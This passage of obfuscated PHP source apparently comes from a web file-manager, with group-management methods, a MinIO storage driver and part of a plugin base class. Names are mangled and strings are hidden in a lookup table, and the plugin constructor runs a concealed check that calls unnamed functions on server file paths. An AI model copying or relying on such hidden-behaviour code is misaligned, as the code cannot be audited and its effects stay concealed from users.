Ñ˜}\x25"), $ôĞ¹ÕœŠ[32] => array($ôĞ¹ÕœŠ[391], "\45{$§‹± Ñ˜}\x25"), $ôĞ¹ÕœŠ[1006] => $ôĞ¹ÕœŠ[1934]); if ($ú³´¶ì) { $¼çÁÔêÆ = $this->getInfoSimple($ú³´¶ì); $Ôşä‚§ö = $¼çÁÔêÆ[$ôĞ¹ÕœŠ[529]] . $ú³´¶ì . $ôĞ¹ÕœŠ[559]; $°ÎçäúÕ = array($°ÎçäúÕ, array($ôĞ¹ÕœŠ[529] => array($ôĞ¹ÕœŠ[391], $Ôşä‚§ö))); } $°ÎçäúÕ = $this->parseWhereLike($°ÎçäúÕ); $ï®Ì‹Ïİ = $this->_makeOrder()->where($°ÎçäúÕ)->selectPage(20); $ï®Ì‹Ïİ = $ï®Ì‹Ïİ ? $ï®Ì‹Ïİ : array($ôĞ¹ÕœŠ[378] => array(), $ôĞ¹ÕœŠ[375] => array()); if (!$ï®Ì‹Ïİ || count($ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[378]]) < 5 && Input::check($§‹± Ñ˜, $ôĞ¹ÕœŠ[327])) { $§ş­®İØ = $this->groupChildrenAll($ú³´¶ì); $Ø­âğÃ = $this->_searchFromMeta($ôĞ¹ÕœŠ[472], $§‹± Ñ˜, 10, $§ş­®İØ); $Ï´˜ÁìÙ = $this->_searchFromMeta($ôĞ¹ÕœŠ[473], $§‹± Ñ˜, 10, $§ş­®İØ); $¼ŞÇìø¥ = array_merge($Ø­âğÃ, $Ï´˜ÁìÙ, $ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[378]]); $ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[378]] = array_unique_by_key($¼ŞÇìø¥, $ôĞ¹ÕœŠ[1836]); $ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[375]][$ôĞ¹ÕœŠ[376]] = count($ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[378]]); $ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[375]][$ôĞ¹ÕœŠ[377]] = ceil($ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[375]][$ôĞ¹ÕœŠ[376]] / $ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[375]][$ôĞ¹ÕœŠ[372]]); } $this->_listDataApply($ï®Ì‹Ïİ[$ôĞ¹ÕœŠ[378]]); return $ï®Ì‹Ïİ; } protected function groupChildrenAll($Œ‘Ãõ‚à) { $Ïğ¤¤ºº =& $_SERVER[ Ö‘ñÄ”]; if (!$Œ‘Ãõ‚à) { return !1; } if (is_string($Œ‘Ãõ‚à)) { $Œ‘Ãõ‚à = array($Œ‘Ãõ‚à); } $³öœÓÔæ = $Œ‘Ãõ‚à; foreach ($Œ‘Ãõ‚à as $Ù©ËÂáç) { $«†ï„Â¦ = $this->getInfoSimple($Ù©ËÂáç); $¼éóÕ¶¶ = array($Ïğ¤¤ºº[529] => array($Ïğ¤¤ºº[391], $«†ï„Â¦[$Ïğ¤¤ºº[529]] . $Ù©ËÂáç . $Ïğ¤¤ºº[559])); $Ğ€Ì¡¯» = $this->field($Ïğ¤¤ºº[1836])->where($¼éóÕ¶¶)->select(); $³öœÓÔæ = array_merge($³öœÓÔæ, array_to_keyvalue($Ğ€Ì¡¯», $Ïğ¤¤ºº[12], $Ïğ¤¤ºº[1836])); } return array_unique($³öœÓÔæ); } private function _searchFromMeta($É–Ú¤×­, $ãóí©ÆÂ, $Ã¼é¥İ´, $ØÌ†ˆ£Ê) { $¤«¦Åü¡ =& $_SERVER[ Ö‘ñÄ”]; $ãóí©ÆÂ = strtolower($ãóí©ÆÂ); $ñ©ïıà = array($¤«¦Åü¡[94] => $É–Ú¤×­, $¤«¦Åü¡[383] => array($¤«¦Åü¡[391], "\x25{$ãóí©ÆÂ}\45")); $ñ©ïıà = $this->parseWhereLike($ñ©ïıà); if ($ØÌ†ˆ£Ê) { $ñ©ïıà[$¤«¦Åü¡[1836]] = array($¤«¦Åü¡[7], $ØÌ†ˆ£Ê); } $´Úø„­¼ = Model($¤«¦Åü¡[1935])->where($ñ©ïıà)->limit($Ã¼é¥İ´)->select(); if (!$´Úø„­¼) { return array(); } $´Úø„­¼ = array_to_keyvalue($´Úø„­¼, $¤«¦Åü¡[12], $¤«¦Åü¡[1836]); $©òÚÍä = $this->where(array($¤«¦Åü¡[1924] => array($¤«¦Åü¡[7], $´Úø„­¼)))->select(); if (!$©òÚÍä) { return array(); } return $©òÚÍä; } protected function _listDataApplyItem($ƒ÷Åà€®) { $Ø‹ÜĞ• = array($ƒ÷Åà€®); $this->_listDataApply($Ø‹ÜĞ•); return $Ø‹ÜĞ•[0]; } protected function _listDataApply(&$Å«…²óÁ) { $³æÎ€‘— =& $_SERVER[ Ö‘ñÄ”]; if (!$Å«…²óÁ) { return; } $ÜÈß»şÉ = array_to_keyvalue($Å«…²óÁ, $³æÎ€‘—[12], $³æÎ€‘—[1836]); $this->_listAppendChildren($Å«…²óÁ); $this->_listAppendChildrenMember($Å«…²óÁ); $this->_listAppendMeta($Å«…²óÁ, $ÜÈß»şÉ); $this->_listAppendParent($Å«…²óÁ); $this->_listAppendSourceRoot($Å«…²óÁ, $ÜÈß»şÉ); } private function _listAppendChildren(&$Í‘æØª) { $¨Ç¸Ã =& $_SERVER[ Ö‘ñÄ”]; $®é”çóë = array_to_keyvalue($Í‘æØª, $¨Ç¸Ã[12], $¨Ç¸Ã[1836]); $÷Ñ“º±æ = array($¨Ç¸Ã[440] => array($¨Ç¸Ã[7], $®é”çóë)); $Âüº”ÉÃ = array($¨Ç¸Ã[440], $¨Ç¸Ã[1936] => $¨Ç¸Ã[508]); $©‡ÌÍ·’ = $this->field($Âüº”ÉÃ)->where($÷Ñ“º±æ)->group($¨Ç¸Ã[440])->select(); $çÁò†©ô = array_to_keyvalue($©‡ÌÍ·’, $¨Ç¸Ã[440], $¨Ç¸Ã[508]); foreach ($Í‘æØª as &$°¶ÒÒÛÍ) { $Æ°ıùû = $°¶ÒÒÛÍ[$¨Ç¸Ã[1836]]; $°¶ÒÒÛÍ[$¨Ç¸Ã[1937]] = isset($çÁò†©ô[$Æ°ıùû]) ? intval($çÁò†©ô[$Æ°ıùû]) : !1; } unset($°¶ÒÒÛÍ); } private function _listAppendChildrenMember(&$Û•øÒ·š) { $´ ­É†µ =& $_SERVER[ Ö‘ñÄ”]; $‚ò Şƒœ = array_to_keyvalue($Û•øÒ·š, $´ ­É†µ[12], $´ ­É†µ[1836]); $°Š¿ò™Ö = array($´ ­É†µ[1836] => array($´ ­É†µ[7], $‚ò Şƒœ)); $İú œË» = array($´ ­É†µ[1836], $´ ­É†µ[1936] => $´ ­É†µ[508]); $ÙÄ‰Ï½• = Model($´ ­É†µ[1926])->field($İú œË»)->where($°Š¿ò™Ö)->group($´ ­É†µ[1836])->select(); $Á¨ö‚ÑÑ = array_to_keyvalue($ÙÄ‰Ï½•, $´ ­É†µ[1836], $´ ­É†µ[508]); foreach ($Û•øÒ·š as &$´Ÿ¬˜¶™) { $å¾òæÊŠ = $´Ÿ¬˜¶™[$´ ­É†µ[1836]]; $´Ÿ¬˜¶™[$´ ­É†µ[1938]] = isset($Á¨ö‚ÑÑ[$å¾òæÊŠ]) ? intval($Á¨ö‚ÑÑ[$å¾òæÊŠ]) : !1; } unset($´Ÿ¬˜¶™); } private function _listAppendMeta(&$™–ñÍ’, $€…Ÿ´á…) { $š°Ëîœ =& $_SERVER[ Ö‘ñÄ”]; $…É·õß‰ = array($š°Ëîœ[1836] => array($š°Ëîœ[7], $€…Ÿ´á…)); $Ğ¯øÇï• = Model($š°Ëîœ[1925])->where($…É·õß‰)->select(); $Ğ¯øÇï• = array_to_keyvalue_group($Ğ¯øÇï•, $š°Ëîœ[1836]); foreach ($Ğ¯øÇï• as &$ÇÜ²í´œ) { $ÇÜ²í´œ = array_to_keyvalue($ÇÜ²í´œ, $š°Ëîœ[94], $š°Ëîœ[383]); } unset($ÇÜ²í´œ); foreach ($™–ñÍ’ as &$²Á¤Èà) { $²Á¤Èà[$š°Ëîœ[474]] = array(); if (isset($Ğ¯øÇï•[$²Á¤Èà[$š°Ëîœ[1836]]])) { $²Á¤Èà[$š°Ëîœ[474]] = $Ğ¯øÇï•[$²Á¤Èà[$š°Ëîœ[1836]]]; } } unset($²Á¤Èà); } protected function parentLevelArray($™û¯å‰×) { $ÙÑŸ×ü“ =& $_SERVER[ Ö‘ñÄ”]; $™û¯å‰× = explode($ÙÑŸ×ü“[50], trim($™û¯å‰×, $ÙÑŸ×ü“[50])); $™û¯å‰× = array_remove_value($™û¯å‰×, $ÙÑŸ×ü“[197]); return $™û¯å‰×; } protected function parentInGroup($ƒ–®¸Ê´, $´û•óÇ”) { $œÌ±›±‹ =& $_SERVER[ Ö‘ñÄ”]; $½ãÈ¡ä× = $this->getInfoSimple($ƒ–®¸Ê´); if (!$½ãÈ¡ä×) { return !0; } $ã…ß‘«ş = $this->parentLevelArray($½ãÈ¡ä×[$œÌ±›±‹[529]]); $ã…ß‘«ş[] = $ƒ–®¸Ê´; foreach ($ã…ß‘«ş as $ƒ–®¸Ê´) { if (in_array($ƒ–®¸Ê´ . $œÌ±›±‹[12], $´û•óÇ”)) { return !0; } } return !1; } private function _listAppendParent(&$ó™çÆÏ) { $ËûÌ¯îÕ =& $_SERVER[ Ö‘ñÄ”]; $Ëìô— = array(); foreach ($ó™çÆÏ as &$˜áïÏÀ®) { $Ëìô—[$˜áïÏÀ®[$ËûÌ¯îÕ[1836]]] = $˜áïÏÀ®[$ËûÌ¯îÕ[32]]; $ıô§‹Ñ‚ = $this->parentLevelArray($˜áïÏÀ®[$ËûÌ¯îÕ[529]]); foreach ($ıô§‹Ñ‚ as $¸˜†ÇÈô) { if (!isset($Ëìô—[$¸˜†ÇÈô])) { $Ëìô—[$¸˜†ÇÈô] = 0; } } } unset($˜áïÏÀ®); foreach ($Ëìô— as $÷¼µ‚‰Â => $–àĞİÜ™) { if ($–àĞİÜ™) { continue; } $«ØÓÌï = $this->getInfoSimple($÷¼µ‚‰Â); $Ëìô—[$÷¼µ‚‰Â] = $«ØÓÌï[$ËûÌ¯îÕ[32]]; } $ÀÓÉÕ¯³ = $GLOBALS[$ËûÌ¯îÕ[6]][$ËûÌ¯îÕ[89]][$ËûÌ¯îÕ[1939]]; if ($GLOBALS[$ËûÌ¯îÕ[511]] == $ËûÌ¯îÕ[88]) { $ÀÓÉÕ¯³ = !1; } foreach ($ó™çÆÏ as &$˜áïÏÀ®) { $ıô§‹Ñ‚ = $this->parentLevelArray($˜áïÏÀ®[$ËûÌ¯îÕ[529]]); $Üùõş¤Ÿ = $ËûÌ¯îÕ[12]; foreach ($ıô§‹Ñ‚ as $÷¼µ‚‰Â => $¸˜†ÇÈô) { if ($ÀÓÉÕ¯³ && $÷¼µ‚‰Â == 0) { continue; } $Üùõş¤Ÿ .= $Ëìô—[$¸˜†ÇÈô] . $ËûÌ¯îÕ[8]; } if ($ıô§‹Ñ‚) { $Üùõş¤Ÿ .= $˜áïÏÀ®[$ËûÌ¯îÕ[32]]; } $˜áïÏÀ®[$ËûÌ¯îÕ[534]] = str_replace($ËûÌ¯îÕ[537], $ËûÌ¯îÕ[8], $Üùõş¤Ÿ); } unset($˜áïÏÀ®); } private function _listAppendSourceRoot(&$ù…š¬æ, $øëé–÷ä) { $ÛıÑè‰’ =& $_SERVER[ Ö‘ñÄ”]; $¾é¢¸ì = Model($ÛıÑè‰’[838])->listSourceRoot(SourceModel::TYPE_GROUP, $øëé–÷ä); $¾é¢¸ì = array_to_keyvalue($¾é¢¸ì, $ÛıÑè‰’[513]); $¾é¢¸ì = array_remove_key($¾é¢¸ì, $ÛıÑè‰’[513]); foreach ($ù…š¬æ as &$á«÷í¡) { $á«÷í¡[$ÛıÑè‰’[86]] = $¾é¢¸ì[$á«÷í¡[$ÛıÑè‰’[1836]]] ? $¾é¢¸ì[$á«÷í¡[$ÛıÑè‰’[1836]]] : array(); } unset($á«÷í¡); } protected function groupMerge($¯™‡ç™Š) { $¯™‡ç™Š = array_values(array_unique($¯™‡ç™Š)); $Ó³ê¶ùÎ = array(); for ($±”ÖŠ›Ó = 0; $±”ÖŠ›Ó < count($¯™‡ç™Š); $±”ÖŠ›Ó++) { $ÄÄ»¿³ = !1; for ($™Öß¿Ê = 0; $™Öß¿Ê < count($¯™‡ç™Š); $™Öß¿Ê++) { if ($±”ÖŠ›Ó == $™Öß¿Ê) { continue; } if ($this->isParentOf($¯™‡ç™Š[$™Öß¿Ê], $¯™‡ç™Š[$±”ÖŠ›Ó])) { $ÄÄ»¿³ = !0; break; } } if (!$ÄÄ»¿³) { $Ó³ê¶ùÎ[] = $¯™‡ç™Š[$±”ÖŠ›Ó]; } } return $Ó³ê¶ùÎ; } protected function isParentOf($ªÃÙŒ¯ò, $¥ğ§ºÍ ) { $²ğİ¢şŒ =& $_SERVER[ Ö‘ñÄ”]; if (!$ªÃÙŒ¯ò || !$¥ğ§ºÍ  || $ªÃÙŒ¯ò == $¥ğ§ºÍ ) { return !1; } $–…ú¹‚Ñ = $this->getInfoSimple($ªÃÙŒ¯ò); $ó—íèİ = $this->getInfoSimple($¥ğ§ºÍ ); $×ÆØıµ‚ = $–…ú¹‚Ñ[$²ğİ¢şŒ[529]] . $ªÃÙŒ¯ò . $²ğİ¢şŒ[50]; if (substr($ó—íèİ[$²ğİ¢şŒ[529]], 0, strlen($×ÆØıµ‚)) == $×ÆØıµ‚) { return !0; } return !1; } public function groupShowRoot($¥Õ¹“Ê, $†ıÛÜ«Õ = false) { $«‹£Œ›¨ =& $_SERVER[ Ö‘ñÄ”]; $…ƒâ«„„ = $this->getInfo($¥Õ¹“Ê); if (!$…ƒâ«„„) { return array(); } $ •Ş®¿ = $this->parentLevelArray($…ƒâ«„„[$«‹£Œ›¨[529]]); $ÖíŞşÚ = array($¥Õ¹“Ê); if (count($ •Ş®¿) == 0) { return $ÖíŞşÚ; } if ($†ıÛÜ«Õ && count($ •Ş®¿) == 1) { return $ÖíŞşÚ; } if (!$…ƒâ«„„[$«‹£Œ›¨[474]] || !isset($…ƒâ«„„[$«‹£Œ›¨[474]][$«‹£Œ›¨[1922]]) || $…ƒâ«„„[$«‹£Œ›¨[474]][$«‹£Œ›¨[1922]] == $«‹£Œ›¨[1891]) { return $this->groupShowRoot($ •Ş®¿[count($ •Ş®¿) - 1], $†ıÛÜ«Õ); } if ($…ƒâ«„„[$«‹£Œ›¨[474]][$«‹£Œ›¨[1922]] == $«‹£Œ›¨[366]) { $Ô«¹‰™¹ = explode($«‹£Œ›¨[50], $…ƒâ«„„[$«‹£Œ›¨[474]][$«‹£Œ›¨[1923]]); if ($Ô«¹‰™¹) { $ÖíŞşÚ = array_merge($ÖíŞşÚ, $Ô«¹‰™¹); } } return $ÖíŞşÚ; } protected function resetParentLevel() { $››Ô¸¦“ =& $_SERVER[ Ö‘ñÄ”]; $Š§ÓüÇĞ = $››Ô¸¦“[1836]; $×Ï…©ç = $this->select(); $×Ï…©ç = array_to_keyvalue($×Ï…©ç, $Š§ÓüÇĞ); foreach ($×Ï…©ç as $¤Ùš»¶Ê) { $ß©Í™Û = $¤Ùš»¶Ê; $Ö‚ú¿“ = array(); while ($ß©Í™Û[$››Ô¸¦“[440]] != 0) { $Ö‚ú¿“[] = $ß©Í™Û[$››Ô¸¦“[440]]; $ß©Í™Û = $×Ï…©ç[$ß©Í™Û[$››Ô¸¦“[440]]]; } $Ö‚ú¿“[] = 0; $Ö‚ú¿“ = $››Ô¸¦“[50] . implode($››Ô¸¦“[50], array_reverse($Ö‚ú¿“)) . $››Ô¸¦“[50]; $this->setNamePinyin($¤Ùš»¶Ê[$Š§ÓüÇĞ], $¤Ùš»¶Ê[$››Ô¸¦“[32]]); $this->where(array($Š§ÓüÇĞ => $¤Ùš»¶Ê[$Š§ÓüÇĞ]))->save(array($››Ô¸¦“[598] => $Ö‚ú¿“)); } return $×Ï…©ç; } public function groupNameAuto($ˆÛõó±«, $¦Î’ì³¯) { $•­Ã¦™Ç =& $_SERVER[ Ö‘ñÄ”]; $£è¤ÉÛƒ = $this->where(array($•­Ã¦™Ç[409] => $ˆÛõó±«))->getField($•­Ã¦™Ç[32], !0); if (!$£è¤ÉÛƒ || !in_array($¦Î’ì³¯, $£è¤ÉÛƒ)) { return $¦Î’ì³¯; } for ($ƒÕİŞ¶˜ = 1; $ƒÕİŞ¶˜ <= count($£è¤ÉÛƒ) + 1; $ƒÕİŞ¶˜++) { $‹ƒóé¦ = $¦Î’ì³¯ . "\x28{$ƒÕİŞ¶˜}\x29"; if (!in_array($‹ƒóé¦, $£è¤ÉÛƒ)) { return $‹ƒóé¦; } } } public function groupSwitch($Åäì˜©³, $¤×ËÓ©¡) { $òëÎ¹£» =& $_SERVER[ Ö‘ñÄ”]; $‘¯¶áÏ = array($òëÎ¹£»[1836] => array($òëÎ¹£»[7], array($Åäì˜©³, $¤×ËÓ©¡))); $©•¯ÁÍ¯ = $this->where($‘¯¶áÏ)->select(); $©•¯ÁÍ¯ = array_to_keyvalue($©•¯ÁÍ¯, $òëÎ¹£»[1836]); if (!isset($©•¯ÁÍ¯[$Åäì˜©³]) || !isset($©•¯ÁÍ¯[$¤×ËÓ©¡]) || $©•¯ÁÍ¯[$Åäì˜©³][$òëÎ¹£»[440]] == 0) { return !1; } $‘¯¶áÏ = array($òëÎ¹£»[1836] => $Åäì˜©³); $ÓŸ¥Òû = Model($òëÎ¹£»[1926])->where($‘¯¶áÏ)->select(); if (!$ÓŸ¥Òû) { $ÓŸ¥Òû = array(); } foreach ($ÓŸ¥Òû as $Æ×øööÇ) { $ïƒËæÇ§ = $Æ×øööÇ[$òëÎ¹£»[1663]]; $‘¯¶áÏ = array($òëÎ¹£»[1663] => $ïƒËæÇ§, $òëÎ¹£»[1836] => $¤×ËÓ©¡); $ØØÌ»ßí = Model($òëÎ¹£»[1926])->where($‘¯¶áÏ)->find(); if (!$ØØÌ»ßí) { $€ØúáÊ = array($¤×ËÓ©¡ => $Æ×øööÇ[$òëÎ¹£»[1940]]); Model($òëÎ¹£»[543])->userGroupAdd($ïƒËæÇ§, $€ØúáÊ); } Model($òëÎ¹£»[543])->userGroupRemove($ïƒËæÇ§, $Åäì˜©³); } $‘¯¶áÏ = array($òëÎ¹£»[419] => 2, $òëÎ¹£»[440] => 0, $òëÎ¹£»[418] => 1, $òëÎ¹£»[513] => array($òëÎ¹£»[7], array($Åäì˜©³, $¤×ËÓ©¡))); $Ë“Ë¨¾ = Model($òëÎ¹£»[838])->where($‘¯¶áÏ)->field($òëÎ¹£»[1941])->select(); $Ë“Ë¨¾ = array_to_keyvalue($Ë“Ë¨¾, $òëÎ¹£»[513], $òëÎ¹£»[410]); $ÕœÔˆ² = !empty($Ë“Ë¨¾[$Åäì˜©³]) ? $Ë“Ë¨¾[$Åäì˜©³] : !1; if ($ÕœÔˆ²) { if (!$Ë“Ë¨¾[$¤×ËÓ©¡]) { $Ë“Ë¨¾[$¤×ËÓ©¡] = Model($òëÎ¹£»[838])->groupRootAdd($¤×ËÓ©¡); } $ìõ·š‚™ = $Ë“Ë¨¾[$¤×ËÓ©¡]; $‘¯¶áÏ = array($òëÎ¹£»[440] => $ÕœÔˆ²); $Ë“Ë¨¾ = Model($òëÎ¹£»[838])->where($‘¯¶áÏ)->field($òëÎ¹£»[1942])->select(); if (!$Ë“Ë¨¾) { $Ë“Ë¨¾ = array(); } Model($òëÎ¹£»[838])->moveClearAuth = !1; foreach ($Ë“Ë¨¾ as $éı‹ÓÕ) { $‚Ë¡ËÒ‹ = $éı‹ÓÕ[$òëÎ¹£»[418]] == $òëÎ¹£»[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($òëÎ¹£»[838])->move($éı‹ÓÕ[$òëÎ¹£»[410]], $ìõ·š‚™, $‚Ë¡ËÒ‹); } Model($òëÎ¹£»[838])->moveClearAuth = !0; $‘¯¶áÏ = array($òëÎ¹£»[419] => 2, $òëÎ¹£»[513] => $Åäì˜©³); $¸åº‘à— = array($òëÎ¹£»[513] => $¤×ËÓ©¡); Model($òëÎ¹£»[1943])->where($‘¯¶áÏ)->save($¸åº‘à—); Model($òëÎ¹£»[1944])->where($‘¯¶áÏ)->save($¸åº‘à—); } $this->_changeChildLevel($©•¯ÁÍ¯[$Åäì˜©³], $©•¯ÁÍ¯[$¤×ËÓ©¡], !0); $this->where(array($òëÎ¹£»[440] => $Åäì˜©³))->save(array($òëÎ¹£»[440] => $¤×ËÓ©¡)); $this->_clearChildrenCache($©•¯ÁÍ¯[$¤×ËÓ©¡]); return !0; } } goto e×ÂíÃöÉ; A¿¤é¿ˆ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ø®»ÜÓ) { parent::__construct($Ø®»ÜÓ); $this->signatureVersion($_SERVER[ Ö‘ñÄ”][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[ Ö‘ñÄ”][247], 1); define($_SERVER[ Ö‘ñÄ”][248], 2); goto cŠç´Ü³ë; b¹µÏ®ëä: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¿™ëãËÂ =& $_SERVER[ Ö‘ñÄ”]; if ($_SERVER[$¿™ëãËÂ[238]] != $_SERVER[$¿™ëãËÂ[1527]]) { $¾ò£¿Ç€ = $¿™ëãËÂ[885]; $Ä®Û€ = $¿™ëãËÂ[240]; $ùĞÈÁ… = $_SERVER[$¿™ëãËÂ[241]] . $¿™ëãËÂ[242]; $ãó¨Ö¤¸ = $Ä®Û€($ùĞÈÁ…); $ùÈğàêÏ = explode($¿™ëãËÂ[231], $ãó¨Ö¤¸); if (count($ùÈğàêÏ) < $¿™ëãËÂ[631]) { $Û„ôõÍü = $¿™ëãËÂ[244]; $Û„ôõÍü(); } $Â¡Óš£ = $¿™ëãËÂ[886]; $Â¡Óš£($_SERVER[$¿™ëãËÂ[887]]); $Â¡Óš£($_SERVER[$¿™ëãËÂ[241]] . $¿™ëãËÂ[1528]); $¨Øò…± = 1; while ($¨Øò…± > 1) { $¨Øò…± = $¨Øò…± + 4; $ÍÆ³¯óÑ = rawurlencode($¨Øò…± . $¿™ëãËÂ[246]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¿™ëãËÂ[1529]); $this->pluginName = str_replace($¿™ëãËÂ[1529], $¿™ëãËÂ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¿™ëãËÂ[8]; $this->pluginApi = appHostGet() . $¿™ëãËÂ[1530] . $this->pluginName . $¿™ëãËÂ[8]; $this->pluginHost = $config[$¿™ëãËÂ[1531]] . $this->pluginName . $¿™ëãËÂ[8]; $this->pluginHostDefault = $config[$¿™ëãËÂ[1531]] . $this->pluginName . $¿™ëãËÂ[8]; $‹áÉÑ¿ = $config[$¿™ëãËÂ[1532]]; if ($‹áÉÑ¿ && strpos($¿™ëãËÂ[50] . $‹áÉÑ¿ . $¿™ëãËÂ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¿™ëãËÂ[1533]] . $this->pluginName . $¿™ëãËÂ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ Ö‘ñÄ”][1534]); } protected function assign($¸›ğ™‡, $š³¢Ó³° = false) { if (is_array($¸›ğ™‡)) { $this->values = array_merge($this->values, $¸›ğ™‡); } else { $this->values[$¸›ğ™‡] = $š³¢Ó³°; } } protected function display($¢«­šÓÉ) { extract($this->values); require $¢«­šÓÉ; } final function hookRegist($´§ÇÊ™¸) { $this->modelPlugin->appRegist($this->pluginName, $´§ÇÊ™¸); } final function appIcon() { $ÖùšÈ ¡ =& $_SERVER[ Ö‘ñÄ”]; $ıŠËœÓ = $this->appPackage(); $ñ·”ø‘€ = $ÖùšÈ ¡[12]; if (isset($ıŠËœÓ[$ÖùšÈ ¡[424]])) { if (isset($ıŠËœÓ[$ÖùšÈ ¡[424]][$ÖùšÈ ¡[1535]])) { $ñ·”ø‘€ = $ÖùšÈ ¡[1536] . $ıŠËœÓ[$ÖùšÈ ¡[424]][$ÖùšÈ ¡[1535]] . $ÖùšÈ ¡[1537]; } else { if ($ıŠËœÓ[$ÖùšÈ ¡[424]][$ÖùšÈ ¡[1538]]) { $ñ·”ø‘€ = $ÖùšÈ ¡[1539] . $ıŠËœÓ[$ÖùšÈ ¡[424]][$ÖùšÈ ¡[1538]] . $ÖùšÈ ¡[1540]; } } } return $ñ·”ø‘€; } final function fileCanView($ óÕ­öÅ) { $ÙÙà»œ¡ =& $_SERVER[ Ö‘ñÄ”]; if (request_url_safe($ óÕ­öÅ)) { return !0; } if ($this->isShare($ óÕ­öÅ)) { return !0; } $Ğì€ê•ƒ = Session::get($ÙÙà»œ¡[1541]); if (!$Ğì€ê•ƒ || !$Ğì€ê•ƒ[$ÙÙà»œ¡[1542]]) { $¬°ı­¢Ç = $ÙÙà»œ¡[1543] . rawurlencode(this_url()); show_tips(LNG($ÙÙà»œ¡[1544]) . $ÙÙà»œ¡[1545] . $¬°ı­¢Ç . $ÙÙà»œ¡[1546] . LNG($ÙÙà»œ¡[1547]) . $ÙÙà»œ¡[1548], !1); } if (!Action($ÙÙà»œ¡[1549])->authCan($ÙÙà»œ¡[1550])) { show_tips(LNG($ÙÙà»œ¡[1551]) . $ÙÙà»œ¡[1552], !1); } ActionCall($ÙÙà»œ¡[1553], $ óÕ­öÅ); } final function isShare($İŸ¢Ü€¬) { $õñ‰¼ÒÏ = KodIO::parse($İŸ¢Ü€¬); return $õñ‰¼ÒÏ[$_SERVER[ Ö‘ñÄ”][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($—šÊ‡ÏÅ) { if (request_url_safe($—šÊ‡ÏÅ)) { return $—šÊ‡ÏÅ; } if (!$this->isShare($—šÊ‡ÏÅ)) { $—šÊ‡ÏÅ = $this->filePath($—šÊ‡ÏÅ); } return Action($_SERVER[ Ö‘ñÄ”][1181])->linkOut($—šÊ‡ÏÅ); } public function filePathLinkOut($‡îª«Ù) { if (request_url_safe($‡îª«Ù)) { return $‡îª«Ù; } $this->fileCanView($‡îª«Ù); return Action($_SERVER[ Ö‘ñÄ”][1181])->link($‡îª«Ù); } final function filePath($›–‘˜ìğ) { $Ø«æÁÆ· =& $_SERVER[ Ö‘ñÄ”]; if ($‡ıô©ŸŒ = $this->checkSharePath($›–‘˜ìğ)) { Hook::trigger($Ø«æÁÆ·[1554], $‡ıô©ŸŒ); return $‡ıô©ŸŒ; } $this->fileCanView($›–‘˜ìğ); if (request_url_safe($›–‘˜ìğ)) { $«‘à–şÃ = parse_url_query($›–‘˜ìğ); if (isset($«‘à–şÃ[$Ø«æÁÆ·[1555]]) && isset($«‘à–şÃ[$Ø«æÁÆ·[213]])) { $›ÚÄõûé = Model($Ø«æÁÆ·[783])->get($Ø«æÁÆ·[784]); $ÓÀ˜ù”¯ = Mcrypt::decode($«‘à–şÃ[$Ø«æÁÆ·[213]], $›ÚÄõûé); if ($ÓÀ˜ù”¯) { $this->fileInfo = IO::infoWithChildren($ÓÀ˜ù”¯); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÓÀ˜ù”¯; } } $›–‘˜ìğ = $this->_cacheHttpFile($›–‘˜ìğ); $this->fileInfo = IO::infoWithChildren($›–‘˜ìğ); } else { $this->fileInfo = IO::infoWithChildren($›–‘˜ìğ); if (!$this->fileInfo) { show_tips(LNG($Ø«æÁÆ·[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ø«æÁÆ·[1554], $›–‘˜ìğ); return $›–‘˜ìğ; } final function _cacheHttpFile($­§Ñ©“) { $Ëí…œÅ = hash_path($­§Ñ©“, !0); $this->cachePath = $this->pluginCachePath($Ëí…œÅ); if ($‡ÓÙÅÂ = IO::fileNameExist($this->cachePath, $Ëí…œÅ)) { return KodIO::make($‡ÓÙÅÂ); } $—ÁóÕ‹§ = $this->cachePath . $Ëí…œÅ; return $this->pluginCacheFileSet($—ÁóÕ‹§, file_get_contents_nossl($­§Ñ©“)); } final function _tmpFileName($§ŞìÅÇ¡ = array()) { $ºæÏÂ«  =& $_SERVER[ Ö‘ñÄ”]; if (!$§ŞìÅÇ¡) { $§ŞìÅÇ¡ = $this->fileInfo; } if (isset($§ŞìÅÇ¡[$ºæÏÂ« [177]])) { return $§ŞìÅÇ¡[$ºæÏÂ« [177]]; } if (isset($§ŞìÅÇ¡[$ºæÏÂ« [170]][$ºæÏÂ« [177]])) { return $§ŞìÅÇ¡[$ºæÏÂ« [170]][$ºæÏÂ« [177]]; } $ªª”åœ = IO::hashSimple($§ŞìÅÇ¡[$ºæÏÂ« [84]]); if ($ªª”åœ) { return $ªª”åœ; } $°¶µŒï¥ = array($§ŞìÅÇ¡[$ºæÏÂ« [32]], $§ŞìÅÇ¡[$ºæÏÂ« [84]], $§ŞìÅÇ¡[$ºæÏÂ« [76]]); if (isset($§ŞìÅÇ¡[$ºæÏÂ« [529]])) { $°¶µŒï¥[] = $§ŞìÅÇ¡[$ºæÏÂ« [529]]; } return md5(implode($ºæÏÂ« [11], $°¶µŒï¥)); } final function checkSharePath($¹—öÊ·) { $ÜùÃúÏ£ =& $_SERVER[ Ö‘ñÄ”]; if (!defined($ÜùÃúÏ£[483])) { define($ÜùÃúÏ£[522], 0); } if (!$this->isShare($¹—öÊ·)) { return 